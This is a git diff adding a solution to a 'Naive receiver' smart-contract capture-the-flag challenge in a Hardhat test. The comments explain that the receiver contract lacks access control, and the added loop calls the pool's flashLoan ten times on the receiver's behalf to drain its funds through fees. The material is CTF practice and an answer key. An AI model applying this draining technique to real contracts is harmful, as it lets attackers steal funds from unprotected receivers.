@@ -31,6 +31,28 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+
+        // So in the receiver contract it hardcodes the pool address in the constructor
+        // We can't make our own flashloan contract
+
+       // I mean, neither of the contracts are ownable or access restricted or anything
+       // Could I just make 10 flashloans myself and cost the receiver guy 1 ETH * 10 times? 
+
+       // Yes! This works, poor receiver guy lol
+
+       // SOLUTION 1 ========================================================== 
+
+       for(let i=0; i<10; i++) {
+         const tx = await this.pool.connect(attacker).flashLoan(this.receiver.address, 0)
+         tx.wait()
+       }
+
+       // HOWEVER! They say in the problem scope 'doing it in a single transaction is a big plus ;)'
+       // How could I do that? 
+
+       // I could make my own Smart Contract that creates the flash loans repeatedly inside one transaction? 
+       // I'll leave this as a TODO~ for another time 
+
     });
 
     after(async function () {
